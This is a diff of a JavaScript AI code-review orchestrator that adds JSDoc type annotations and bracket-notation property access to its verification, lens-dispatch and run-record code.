-    return { ...f, tier: 'suspected', why: `${f.why} (demoted to Suspected: the load-bearing premise is off-site and no verifier could pin it to real code${f.whereChecked ? ` — claimed at ${f.whereChecked}` : ', and whereChecked was empty'})` }
+    return { ...f, tier: 'suspected', why: `${f['why']} (demoted to Suspected: the load-bearing premise is off-site and no verifier could pin it to real code${f['whereChecked'] ? ` — claimed at ${f['whereChecked']}` : ', and whereChecked was empty'})` }
   }
   if (tier === 'confirmed' && !reach) {
-    const demoted = DEMOTE[f.severity] || f.severity
-    return { ...f, tier, severity: demoted, why: `${f.why} (severity demoted ${f.severity}→${demoted}: not on a production-reachable path)` }
+    const demoted = DEMOTE[f['severity']] || f['severity']
+    return { ...f, tier, severity: demoted, why: `${f['why']} (severity demoted ${f['severity']}→${demoted}: not on a production-reachable path)` }
   }
   return { ...f, tier }
 }
@@ -4480,6 +4551,7 @@ function decideTier(f, live, v) {
 // panel. The thinning is annotated on the finding (what a reader of the verdict sees) and counted in
 // the run record as `verification.thinned` (what ranks across runs — a panel that keeps half-dying
 // is fragility, and fragility is only legible as a repeat).
+/** @param {Finding} f @param {Vote[]} votes @returns {Finding} */
 function tierFromVotes(f, votes) {
   const live = votes.filter(Boolean)
   // Off-schema votes are discarded BEFORE the arithmetic, not read as all-false (see isVerdictShaped).
@@ -4492,7 +4564,7 @@ function tierFromVotes(f, votes) {
   // the clause below would be false twice over (no tier "stands on" anything, and the surviving
   // count is zero). But the discard is still the largest one there is, and dropping the flag here
   // made the counter read 0 for it: the flag is set, the sentence is not.
-  if (judged.tier === 'unverified') return { ...judged, votesDiscarded: discarded }
+  if (judged['tier'] === 'unverified') return { ...judged, votesDiscarded: discarded }
   // ARITHMETIC, NOT A WORD FOR IT. The earlier phrasing said "a minority of the panel that answered"
   // unconditionally, which is false whenever the survivors are the larger half — at `verifyVotes: 3`
   // with one discard the verdict stands on 2 of 3. Only the share is named, and it is computed.
@@ -4500,7 +4572,7 @@ function tierFromVotes(f, votes) {
   return {
     ...judged,
     votesDiscarded: discarded,
-    why: `${judged.why} (PANEL THINNED: ${discarded} of ${live.length} returned votes answered off-schema and were discarded before the arithmetic — this ${judged.tier} stands on ${v.length} of ${live.length} returned votes, ${share} the panel that answered)`,
+    why: `${judged['why']} (PANEL THINNED: ${discarded} of ${live.length} returned votes answered off-schema and were discarded before the arithmetic — this ${judged['tier']} stands on ${v.length} of ${live.length} returned votes, ${share} the panel that answered)`,
   }
 }
 // The round-local half of the clause above, for the ledger door. Like TRACKED_MARK, "this verdict
@@ -4532,15 +4604,16 @@ const BATCH_VERDICT_SCHEMA = {
     },
   },
 }
+/** @param {Finding[]} group @param {Profile} profile */
 function batchVerifyPrompt(group, profile) {
   const pfs = group.map((f, i) => {
     const pf = promptFields(f)
     return `--- FINDING ${i} ---
 [${pf.severity}] ${pf.title}
-  at ${pf.file || '?'}:${f.line || 0}
-  why: ${sanitizeAttack(f.why)}
-  source: ${sanitizeAttack(f.source)}${f.ruleId ? ` · rule ${pf.ruleId}` : ''}
-  off-site evidence claimed: ${f.whereChecked ? pf.whereChecked : '(none — claims to be self-contained at the cited line)'}`
+  at ${pf.file || '?'}:${f['line'] || 0}
+  why: ${sanitizeAttack(f['why'])}
+  source: ${sanitizeAttack(f['source'])}${f['ruleId'] ? ` · rule ${pf.ruleId}` : ''}
+  off-site evidence claimed: ${f['whereChecked'] ? pf.whereChecked : '(none — claims to be self-contained at the cited line)'}`
   }).join('\n')
   return `You are a skeptic verifying ${group.length} INDEPENDENT ${profile.lang} review findings in one pass. They are batched only to save cost — judge each ENTIRELY on its own evidence. Never let one finding's verdict influence another's, and never assume a batch "should" contain some proportion of real ones.
 
@@ -4558,11 +4631,13 @@ ${pfs}
 
 Return {verdicts: [...]} with ONE entry per finding, each carrying its \`index\` (0..${group.length - 1}). Every index must appear — omitting one silently deletes a finding from the review.`
 }
+/** @param {Finding[]} items @param {Plan} plan @param {Profile} profile @param {string} gateProvenance */
 async function verifyPool(items, plan, profile, gateProvenance) {
   // One breaker per verification pass, handed only to the dispatches this function windows. Its
   // lifetime is the pass: a profile's pass never inherits a window filled by another profile's,
   // whose API reachability it did not observe and whose deaths it cannot re-spend.
   const breaker = makeDeathBreaker()
+  /** @type {{ individual: Finding[], batch: Finding[], skip: Finding[] }} */
   const route = { individual: [], batch: [], skip: [] }
   for (const f of items) route[verifyTier(f)].push(f)
 
@@ -4578,15 +4653,16 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   const unverified = route.skip.map(f => ({
     ...f,
     tier: 'unverified',
-    why: `${f.why} (NOT VERIFIED: no verifier was spent on it — ${f.severity} cannot change the verdict either way, so nothing here has been checked against the code)`,
+    why: `${f['why']} (NOT VERIFIED: no verifier was spent on it — ${f['severity']} cannot change the verdict either way, so nothing here has been checked against the code)`,
   }))
 
   // Batched tier: group by file so one agent reads one file's context once.
   const byFile = new Map()
   for (const f of route.batch) {
-    const k = f.file || '?'
+    const k = f['file'] || '?'
     ;(byFile.get(k) || (byFile.set(k, []), byFile.get(k))).push(f)
   }
+  /** @type {Finding[][]} */
   const groups = []
   for (const [, fs] of byFile) for (let i = 0; i < fs.length; i += BATCH_SIZE) groups.push(fs.slice(i, i + BATCH_SIZE))
 
@@ -4599,10 +4675,10 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // verbatim error text: the run record's `notRun` is ranked by exact string to surface repeated
   // fragility, and an error message (or a run-specific path) makes every entry unique and sinks the
   // real repeats — the same reason `uncoveredFiles` is ranked separately.
-  const deadGroup = (group, why) => {
-    const what = `the batch verifier for ${group[0].file || '?'} ${why}`
+  const deadGroup = (/** @type {Finding[]} */ group, /** @type {string} */ why) => {
+    const what = `the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} ${why}`
     log(`⚠️ [${profile.id}] ${what} — its ${group.length} finding(s) were NOT checked against the code; reported as unverified and excluded from the verification counters`)
-    return group.map(f => NOT_VERIFIED(f, `${what}, so nothing checked this finding against the code`))
+    return group.map((/** @type {Finding} */ f) => NOT_VERIFIED(f, `${what}, so nothing checked this finding against the code`))
   }
 
   // Batched and individual verification look at DISJOINT findings — routing put each one in exactly
@@ -4622,9 +4698,9 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // and converts into `notRun` only if the Block it was justified by fails to arrive.
   // `verifySkipped` is the flag that keeps the two apart, since they need a re-run for opposite
   // reasons.
-  const floorSkippedGroup = group => {
-    log(`💰 [${profile.id}] the batch verifier for ${group[0].file || '?'} was NOT dispatched — ${floorSkipReason(floor)}; its ${group.length} finding(s) are reported as unverified and excluded from the verification counters`)
-    return group.map(f => ({ ...NOT_VERIFIED(f, floorSkipReason(floor)), verifySkipped: true }))
+  const floorSkippedGroup = (/** @type {Finding[]} */ group) => {
+    log(`💰 [${profile.id}] the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} was NOT dispatched — ${floorSkipReason(floor)}; its ${group.length} finding(s) are reported as unverified and excluded from the verification counters`)
+    return group.map((/** @type {Finding} */ f) => ({ ...NOT_VERIFIED(f, floorSkipReason(floor)), verifySkipped: true }))
   }
 
   const batchThunks = groups.map(group => () =>
@@ -4634,7 +4710,7 @@ async function verifyPool(items, plan, profile, gateProvenance) {
     // always answer no, and the whole population would be bought.
     (verdictNeutralNow(group[0], floor)
       ? Promise.resolve(floorSkippedGroup(group))
-      : ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${group[0].file || '?'}(${group.length})`, phase: 'Verify', breaker, schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
+      : ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${/** @type {Finding} */ (group[0])['file'] || '?'}(${group.length})`, phase: 'Verify', breaker, schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
       .then(res => {
         // THE DISCRIMINATOR. `ragent` answers `null` for a dead agent (API error, skip, or the
         // per-agent deadline) after its one re-dispatch, and that is the DOMINANT death — not the
@@ -4642,12 +4718,12 @@ async function verifyPool(items, plan, profile, gateProvenance) {
         // outcome by a different route: nothing was judged. Either way the group is unverified.
         const death = batchDeath(res)
         if (death) return deadGroup(group, death)
-        return group.map((f, i) => {
-          const v = res.verdicts.find(x => x && x.index === i)
+        return group.map((/** @type {Finding} */ f, /** @type {number} */ i) => {
+          const v = res.verdicts.find((/** @type {Vote} */ x) => x && x['index'] === i)
           // A missing index in a NON-EMPTY verdict list is a verifier that ran and lost one finding —
           // an inspection happened, so this keeps `suspected`. This is the one case that must NOT be
           // folded into the unverified tier, and the only thing that separates it from a death.
-          return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f.why} (batch verifier returned no verdict for this finding)` }
+          return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f['why']} (batch verifier returned no verdict for this finding)` }
         })
       })
       // A batch verifier that THREW — both `ragent` attempts failed — judged nothing, so its group
@@ -4669,16 +4745,16 @@ async function verifyPool(items, plan, profile, gateProvenance) {
 
   const individualThunks = route.individual.map(f => () => {
     // Anything not produced by a review lens came from a deterministic tool (gate seeds: clippy-pedantic, statix, deadnix, semgrep, …) — except dep-context, a reasoning seed (see isToolSource).
-    const isTool = isToolSource(profile, f.source)
-    const isHigh = f.severity === 'Critical' || f.severity === 'High'
+    const isTool = isToolSource(profile, f['source'])
+    const isHigh = f['severity'] === 'Critical' || f['severity'] === 'High'
     const n1 = isHigh ? Math.max(1, plan.verifyVotes) : 1
     // Cull votes on the cheap model.
-    const cull = i => () =>
-      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f.file || '?'}:${f.line || 0}#c${i + 1}`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: CULL_MODEL })
+    const cull = (/** @type {number} */ i) => () =>
+      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#c${i + 1}`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: CULL_MODEL })
     if (!isHigh) return parallel([cull(0)]).then(vs => tierFromVotes(f, vs))
     // A High/Critical always gets exactly one authoritative opus vote combined with the cull votes.
     const auth = () =>
-      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f.file || '?'}:${f.line || 0}#auth`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: plan.lensModel })
+      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#auth`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: plan.lensModel })
     // Open with the DECIDING pair — one cheap cull plus the authoritative vote — and buy the remaining
     // cull votes only when those two disagree. tierFromVotes is a majority rule, so a unanimous pair
     // lands on exactly the tier a unanimous four would: the extra votes only ever change the outcome
@@ -4707,7 +4783,7 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // Every settled individual verdict is offered to the floor. Wrapped here rather than inside the
   // thunk because the thunk has two return points, and a floor raised on one path but not the other
   // is the kind of half-wiring that leaves the saving silently unrealized.
-  const withFloor = run => () => Promise.resolve(run()).then(r => {
+  const withFloor = (/** @type {any} */ run) => () => Promise.resolve(run()).then(r => {
     if (floor.record(r)) log(`💰 [${profile.id}] the verdict is now fixed at Block by a confirmed ${r.severity} (${r.file || '?'}:${r.line || 0}) — Medium batches not yet dispatched can no longer move it and will not be bought`)
     return r
   })
@@ -4726,9 +4802,9 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // back into its own findings by index (the batch side knows its group, the individual side its
   // finding) and routed exactly like every other death.
   const judged = settledVerdicts.slice(0, route.individual.length)
-    .map((r, i) => (r || NOT_VERIFIED(route.individual[i], 'the verifier panel for this finding was lost before it settled — nothing was checked against the code')))
+    .map((r, i) => (r || NOT_VERIFIED(/** @type {Finding} */ (route.individual[i]), 'the verifier panel for this finding was lost before it settled — nothing was checked against the code')))
   const batched = settledVerdicts.slice(route.individual.length)
-    .flatMap((r, i) => (r ? r : deadGroup(groups[i], 'was lost before it settled (its dispatch never produced a result)')))
+    .flatMap((r, i) => (r ? r : deadGroup(/** @type {Finding[]} */ (groups[i]), 'was lost before it settled (its dispatch never produced a result)')))
   const settled = judged.concat(batched)
   // A dead batch's findings arrive through the same list as judged ones and must leave it again:
   // `vp` is the JUDGED population and every count derived from it (candidates, refuteRate) means
@@ -4793,6 +4869,7 @@ const RIGOR_BY_SIZE = {
 const LENS_MODEL = 'opus'
 
 // ================= Per-profile pipeline: scout → gate → lenses → verify → critic =================
+/** @param {Profile} profile */
 async function reviewProfile(profile) {
   // ---- Scout ----
   const scout = await ragent(scoutPrompt(profile), { label: `scout:${profile.id}`, schema: SCOUT_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' })
@@ -4805,7 +4882,7 @@ async function reviewProfile(profile) {
     ? [`${profile.id} scout classification — the plan is the conservative fallback (all lenses, 3-vote, 2 rounds), not a scouted one`]
     : []
   // hasOwn, not truthiness: a bucket of "constructor" would index Object.prototype and pass.
-  const size = Object.hasOwn(RIGOR_BY_SIZE, scout?.sizeBucket ?? '') ? scout.sizeBucket : 'medium'
+  const size = /** @type {keyof typeof RIGOR_BY_SIZE} */ (Object.hasOwn(RIGOR_BY_SIZE, scout?.sizeBucket ?? '') ? scout.sizeBucket : 'medium')
   // Lenses a BLANKET expansion of the roster must not include. A lens is a full agent — the
   // dominant per-run cost — and `failure-windows` is the heaviest in the Rust roster: it enumerates
   // every mutating request on the changed path and plays out each adjacent pair. Its premise is a
@@ -4822,11 +4899,12 @@ async function reviewProfile(profile) {
   // selected — by construction the whole optional set. It went ungated once and bought two of the
   // three on an ordinary large diff. It calls `admitted` too now; putting the gate anywhere but
   // under each of these leaves a door, because every one of them names lenses on its own signals.
-  const admitted = l => !OPTIONAL_LENSES.includes(l) || optionalRequested.includes(l)
-  const blanket = () => profile.lenses.filter(l => !CONDITIONAL_LENSES.includes(l) && admitted(l))
+  const admitted = (/** @type {string} */ l) => !OPTIONAL_LENSES.includes(l) || optionalRequested.includes(l)
+  const blanket = () => profile.lenses.filter((/** @type {string} */ l) => !CONDITIONAL_LENSES.includes(l) && admitted(l))
+  /** @type {Plan} */
   const plan = {
     sizeBucket: size,
-    lenses: (scout?.lenses?.length ? scout.lenses.filter(l => profile.lenses.includes(l) && admitted(l)) : blanket()),
+    lenses: (scout?.lenses?.length ? scout.lenses.filter((/** @type {string} */ l) => profile.lenses.includes(l) && admitted(l)) : blanket()),
     maxRounds: RIGOR_BY_SIZE[size].maxRounds,
     verifyVotes: RIGOR_BY_SIZE[size].verifyVotes,
     lensModel: LENS_MODEL,
@@ -4879,6 +4957,7 @@ async function reviewProfile(profile) {
   // Certain cross-boundary paths the scout can miss force their surfaces ON — never off, so this only
   // ever adds a lens back, never removes one.
   if (changedFiles.some(isContractOrSchemaPath)) { surfaces.crossBoundarySymbol = true; surfaces.wireForm = true }
+  /** @type {string[]} */
   const surfaceDropped = []
   plan.lenses = plan.lenses.filter(lens => {
     const need = SURFACE_GATED_LENSES[lens]
@@ -4889,7 +4968,7 @@ async function reviewProfile(profile) {
   // Only the UNIVERSE is recorded here: which optional lenses this profile could have bought. It rides
   // back on the profile's result; what ran is recorded at dispatch (`runLens`) and subtracted by
   // `optionalTally()`, because the plan is not final at this point — see the tally's definition.
-  const optionalScope = profile.lenses.filter(l => OPTIONAL_LENSES.includes(l))
+  const optionalScope = profile.lenses.filter((/** @type {string} */ l) => OPTIONAL_LENSES.includes(l))
   log(`[${profile.id}] ${scoutFailed ? '⚠️ scout did not return — conservative fallback plan' : (scout.notes || 'scout: classified')} · ${plan.sizeBucket}${plan.securitySensitive ? ' · SECURITY floor (all lenses, 3-vote)' : ''}${plan.lenses.includes('negative-space') ? ' · +negative-space' : ''}`)
 
   // Lens runner: prefer the profile's dedicated reviewer agent; if that agent type is not
@@ -4904,7 +4983,8 @@ async function reviewProfile(profile) {
   // Keyed by DISPATCH, not by lens name. Once a lens fans out over slices there are several live
   // dispatches under one name, and a name-keyed map keeps only the last failure — so the reported
   // reason would name one slice's error as if it were the lens's.
-  const dispatchKey = (lens, slice) => (slice ? `${lens} :: ${slice.key}` : lens)
+  const dispatchKey = (/** @type {string} */ lens, /** @type {Slice | null} */ slice) => (slice ? `${lens} :: ${slice.key}` : lens)
+  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] */
   async function runLens(lens, prompt, phaseName, labelSuffix, slice = null) {
     // The single dispatch point for every lens on every path. Recording here — not at plan time — is
     // what makes the report and the run record physically unable to disagree with what happened.
@@ -4917,7 +4997,7 @@ async function reviewProfile(profile) {
       try {
         return await ragent(prompt, opts)
       } catch (e) {
-        lensFailures.set(dispatchKey(lens, slice), String((e && e.message) || e).slice(0, 160))
+        lensFailures.set(dispatchKey(lens, slice), String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 160))
         return null
       }
     }
@@ -4932,7 +5012,7 @@ async function reviewProfile(profile) {
       noteReviewerAgentFallback(profile)
       return await runGeneric()
     } catch (e) {
-      const msg = String((e && e.message) || e)
+      const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
       // dispatchKey, like the other write to this map. Keyed by bare name the real error message was
       // looked up under a key nobody uses, so a sliced dispatch that died WITH a reason was reported
       // as "died without an error" — and any sibling slice could overwrite it.
@@ -4998,7 +5078,7 @@ async function reviewProfile(profile) {
   // Red, real, and NOT this diff's doing. Kept out of failedChecks so it cannot stop the review, and
   // out of notes so it cannot be quietly lost: it prints on every verdict, including a green one.
   const carriedChecks = gate?.carriedChecks ?? []
-  const seedFindings = (gate?.seedFindings ?? []).map(f => ({ ...f, source: f.source || 'tool' }))
+  const seedFindings = (gate?.seedFindings ?? []).map((/** @type {Finding} */ f) => ({ ...f, source: f['source'] || 'tool' }))
   log(`[${profile.id}] Gate: ${gateStatus} — ${gateProvenance}${failedChecks.length ? ` · failed: ${failedChecks.join(', ')}` : ''}${carriedChecks.length ? ` · ${carriedChecks.length} pre-existing (carried, not blocking)` : ''}`)
   // What a VERIFIER needs to run a tool, as opposed to what the RECORD needs to explain the gate.
   // Kept separate so the preflight's runner prefix never leaks into the persisted provenance string.
@@ -5044,7 +5124,7 @@ async function reviewProfile(profile) {
     try {
       await agent('Reply with the single word: OK.', { label: `probe:${profile.id}`, phase: 'Gate', model: 'haiku', effort: 'low', agentType: profile.reviewerAgent })
     } catch (e) {
-      const msg = String((e && e.message) || e)
+      const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
       if (isAgentTypeMissing(msg, profile.reviewerAgent)) {
         reviewerAgentMissing = true; noteReviewerAgentMissing(profile, msg)
         log(`[${profile.id}] reviewer agent '${profile.reviewerAgent}' not registered — all lenses will use the generic subagent`)
@@ -5068,6 +5148,7 @@ async function reviewProfile(profile) {
   const lensRounds = []
   // Lenses the completeness critic added and that were dispatched — on the record, because they change
   // what a round cost without changing its plan (lib/round-pairs.mjs compares them, realm #97).
+  /** @type {string[]} */
   let criticFollowupLenses = []
   // Computed ONCE for the whole profile, not per round: the changed-file set does not move between
   // rounds, and re-slicing per round would let a lens's slice key drift between round 1 and round 2
@@ -5079,7 +5160,7 @@ async function reviewProfile(profile) {
   if (diffSlices.length) log(`[${profile.id}] diff sliced into ${diffSlices.length} scope(s) for the code-intrinsic lenses: ${diffSlices.map(g => `${g.key} (${g.files.length})`).join(' · ')}. Whole-diff lenses (${WHOLE_DIFF_LENSES.join(', ')}) still see everything.`)
   // `[null]` means "one dispatch, unsliced" — the shape the caller had before slicing existed, so
   // the unsliced path stays the same code rather than a branch that can drift from it.
-  const lensSlicesFor = lens => (diffSlices.length && sliceableLens(lens) ? diffSlices : [null])
+  const lensSlicesFor = (/** @type {string} */ lens) => (diffSlices.length && sliceableLens(lens) ? diffSlices : [null])
   let dry = false
   for (let round = 1; round <= plan.maxRounds && !dry; round++) {
     const priorSummary = priorFoundSummary(pool)
@@ -5100,7 +5181,7 @@ async function reviewProfile(profile) {
     const settled = await weightedWindow(
       dispatches.map(d => ({ weight: 1, run: () => runLens(d.lens, lensPrompt(d.lens, priorSummary, profile, plan, d.slice), 'Lenses', ` r${round}${d.slice ? ` ${d.slice.key}` : ''}`, d.slice) })),
       LENS_WINDOW_AGENTS,
-      (run, i) => run().then(r => (r ? { ...r, __key: dispatchKey(dispatches[i].lens, dispatches[i].slice), __lens: dispatches[i].lens } : null)),
+      (run, i) => run().then((/** @type {Result} */ r) => (r ? { ...r, __key: dispatchKey(/** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens, /** @type {(typeof dispatches)[number]} */ (dispatches[i]).slice), __lens: /** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens } : null)),
     )
     const results = settled.filter(Boolean)
     // `__lens`, not the model's `lens` field. Coverage already avoided trusting it; the finding's
@@ -5194,7 +5275,7 @@ async function reviewProfile(profile) {
     // only key its failure that way. Without the fallback every sliced hole read "died without an
     // error" even when the retry died with a captured message — losing the diagnosis for exactly
     // the sliced case, which is what keying by dispatch was introduced to fix.
-    const reasonFor = k => lensFailures.get(k) || lensFailures.get(String(k).split(' :: ')[0]) || 'returned no result (skipped or died without an error)'
+    const reasonFor = (/** @type {string} */ k) => lensFailures.get(k) || lensFailures.get(String(k).split(' :: ')[0]) || 'returned no result (skipped or died without an error)'
     const reasons = droppedLenses.map(k => `${k}: ${reasonFor(k)}`).join(' · ')
     notRun.push(`${profile.id} lenses that never returned — ${reasons}`)
     log(`⚠️ [${profile.id}] ${droppedLenses.length} lens dispatch(es) never returned (${reasons}). Review marked INCOMPLETE.`)
@@ -5246,7 +5327,7 @@ async function reviewProfile(profile) {
   let criticNotes = ''
   const criticInScope = plan.sizeBucket === 'large' || plan.securitySensitive
   if (criticInScope && (!budget.total || budget.remaining() > 90000)) {
-    const candidates = profile.lenses.filter(l => !plan.lenses.includes(l))
+    const candidates = profile.lenses.filter((/** @type {string} */ l) => !plan.lenses.includes(l))
     const critic = await ragent(
       `You are a completeness critic for a ${profile.lang} review of the diff (base ${flattenField(baseRef) || 'HEAD'}).
 Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${confirmed.length}, Suspected: ${suspected.length}.
@@ -5261,9 +5342,9 @@ Also note in one line anything else likely missed (a changed file no finding tou
     // ("the scout classifies, the code budgets"); letting it re-order lenses on the synthesis phase
     // would return that spend through a side door and undo the boundary. The signal is not thrown
     // away — a refused name is carried to the reader as an uncovered surface, with how to buy it.
-    const named = (critic?.missingLenses ?? []).filter(l => candidates.includes(l))
+    const named = (critic?.missingLenses ?? []).filter((/** @type {string} */ l) => candidates.includes(l))
     for (const l of named) if (!admitted(l)) optionalNamedByCritic.add(l)
-    const refusedOptional = named.filter(l => !admitted(l))
+    const refusedOptional = named.filter((/** @type {string} */ l) => !admitted(l))
     if (refusedOptional.length) log(`[${profile.id}] Completeness critic named optional lens(es) ${refusedOptional.join(', ')} — NOT dispatched (the optional pass is bought by an explicit \`optional=\` request); reported as uncovered.`)
     // realm @nick/craft #102: the surface gate BINDS the critic too, mirroring `admitted()` above and
     // for the same reason. `candidates` is by construction the lenses NOT in the plan, so a lens the
@@ -5273,9 +5354,9 @@ Also note in one line anything else likely missed (a changed file no finding tou
     // this profile does not wrongly suppress another profile's critic. A named-and-dropped lens is
     // refused, carried to the reader as an uncovered surface, and kept out of the follow-up set.
     for (const l of named) if (surfaceDropped.includes(l)) surfaceGateNamedByCritic.add(l)
-    const refusedSurface = named.filter(l => surfaceDropped.includes(l))
+    const refusedSurface = named.filter((/** @type {string} */ l) => surfaceDropped.includes(l))
     if (refusedSurface.length) log(`[${profile.id}] Completeness critic named surface-gated lens(es) ${refusedSurface.join(', ')} — NOT dispatched (the diff does not touch the surface their defect class needs); reported as uncovered.`)
-    const followups = named.filter(l => admitted(l) && !surfaceDropped.includes(l))
+    const followups = named.filter((/** @type {string} */ l) => admitted(l) && !surfaceDropped.includes(l))
     if (followups.length && (!budget.total || budget.remaining() > 60000)) {
       log(`[${profile.id}] Completeness critic → follow-up lenses: ${followups.join(', ')}`)
       criticFollowupLenses = [...followups]
@@ -5285,12 +5366,12 @@ Also note in one line anything else likely missed (a changed file no finding tou
       // is skipped for lack of budget, records both. "The critic said run it and it died" is not a
       // cleaner outcome than "the critic said run it and there was no budget"; it is the same hole in
       // coverage, and the one a re-run can actually fix.
-      const settledExtra = await parallel(followups.map(lens => () =>
+      const settledExtra = await parallel(followups.map((/** @type {string} */ lens) => () =>
         runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Synthesize', ' (critic)'),
       ))
-      const deadFollowups = followups.filter((_l, i) => !settledExtra[i])
+      const deadFollowups = followups.filter((/** @type {string} */ _l, /** @type {number} */ i) => !settledExtra[i])
       if (deadFollowups.length) {
-        notRun.push(...deadFollowups.map(l => `${profile.id} critic follow-up lens ${l} — dispatched and died before returning findings`))
+        notRun.push(...deadFollowups.map((/** @type {string} */ l) => `${profile.id} critic follow-up lens ${l} — dispatched and died before returning findings`))
         log(`⚠️ [${profile.id}] critic follow-up lens(es) ${deadFollowups.join('/')} died before returning findings — recorded as not run; the review is INCOMPLETE`)
       }
       const extra = settledExtra.filter(Boolean).flatMap(r => r.findings || [])
@@ -5322,7 +5403,7 @@ Also note in one line anything else likely missed (a changed file no finding tou
 for (const p of active) results.push(await reviewProfile(p))
 
 // A red gate on any active language blocks the whole review (findings can't be trusted on a broken tree).
-const gateFailed = failedProfiles(results)
+const gateFailed = /** @type {Result[]} */ (failedProfiles(results))
 const runGate = gateRecord(results)
 const mergedProvenance = runGate.provenance
 const mergedGateStatus = runGate.status
@@ -5346,10 +5427,12 @@ const carriedLine = (() => {
 })()
 
 // A short, stable digest of a text, for recording WHAT a round was given without carrying the text.
+/** @param {string} text */
 function digest(text) {
   return [...String(text ?? '')].reduce((h, c) => ((h * 31) + c.charCodeAt(0)) >>> 0, 7).toString(16)
 }
 
+/** @param {Record<string, unknown>} extra */
 function reviewRecord(extra) {
   return {
     schemaVersion: 1,
@@ -5363,7 +5446,7 @@ function reviewRecord(extra) {
     languages: active.map(p => p.id),
     uncoveredFiles,
     lensRounds: results.flatMap(r => (r.lensRounds || []).map(x => ({ language: r.profile.id, ...x }))),
-    scout: results.map(r => ({ language: r.profile.id, size: r.plan.sizeBucket, lenses: r.plan.lenses, model: r.plan.lensModel, maxRounds: r.plan.maxRounds, verifyVotes: r.plan.verifyVotes, securitySensitive: !!r.plan.securitySensitive, isLibrary: !!r.plan.isLibrary })),
+    scout: results.map(r => ({ language: r.profile.id, size: r['plan'].sizeBucket, lenses: r['plan'].lenses, model: r['plan'].lensModel, maxRounds: r['plan'].maxRounds, verifyVotes: r['plan'].verifyVotes, securitySensitive: !!r['plan'].securitySensitive, isLibrary: !!r['plan'].isLibrary })),
     gate: runGate,
     // The optional pass, on the record: `skipped` is the field that keeps a cheap run from reading
     // later — in analyze-runs, in a comparison between two runs — as a full one.
@@ -5383,11 +5466,11 @@ function reviewRecord(extra) {
     // Every breach of the preflight probe budget, per language. Recorded on EVERY run, clean or
     // not: the point of the audit is that the next drift back into CI archaeology shows up in the
     // record of the run that did it, not in a re-measurement months later.
-    preflightProbeViolations: results.flatMap(r => (r.probeViolations || []).map(v => `[${r.profile.id}] ${v}`)),
+    preflightProbeViolations: results.flatMap(r => (r['probeViolations'] || []).map((/** @type {string} */ v) => `[${r.profile.id}] ${v}`)),
     // realm @nick/craft #104: did re-review memory engage this run, and if not, why. `chained` is false
     // with reason 'no-branch' on a detached HEAD — the silent round-1 degradation this field makes
     // legible in the record (the operator-facing half is reReviewMemorySection() in the report).
-    reReview: { chained: reReview.chained, reason: reReview.reason, basisVerdict: priorBasisVerdict, basisMismatch: priorBasisMismatch, basisOverridesLogger, fpComparable: priorFpComparable, tombstonesDropped: tombstonesDroppedForBasis, ledgerDegraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced, priorRound: priorRound?.round ?? null, priorHead: priorRound?.head ?? null },
+    reReview: { chained: reReview.chained, reason: reReview.reason, basisVerdict: priorBasisVerdict, basisMismatch: priorBasisMismatch, basisOverridesLogger, fpComparable: priorFpComparable, tombstonesDropped: tombstonesDroppedForBasis, ledgerDegraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced, priorRound: priorRound?.['round'] ?? null, priorHead: priorRound?.['head'] ?? null },
     // What the lenses were run over and how, so a later comparison of two rounds can tell a memory
     // effect from a scope or configuration effect (lib/round-pairs.mjs, realm @nick/craft #97): a
     // `delta` round on an unchanged head reviews an empty diff.
@@ -5401,7 +5484,7 @@ function reviewRecord(extra) {
     // round costs without being memory (lib/round-pairs.mjs, realm @nick/craft #97).
     base: baseRef || '',
     path: pathArg || '',
-    criticFollowups: results.flatMap(r => (r.criticFollowupLenses || []).map(l => `${r.profile.id}:${l}`)).sort(),
+    criticFollowups: results.flatMap(r => (r['criticFollowupLenses'] || []).map((/** @type {string} */ l) => `${r.profile.id}:${l}`)).sort(),
     intentDigest: digest(intentArg),
     // The author's description that reaches every lens (PR title/body or commit messages), and the
     // changed-file set the diff was taken over — both fetched each round, both change what a round does.
@@ -5413,14 +5496,14 @@ function reviewRecord(extra) {
 }
 
 if (gateFailed.length) {
-  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [...scopeNotRun], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map(c => `[${r.profile.id}] ${c}`)) }))
+  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [...scopeNotRun], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `[${r.profile.id}] ${c}`)) }))
   return out([
     `## Verdict`,
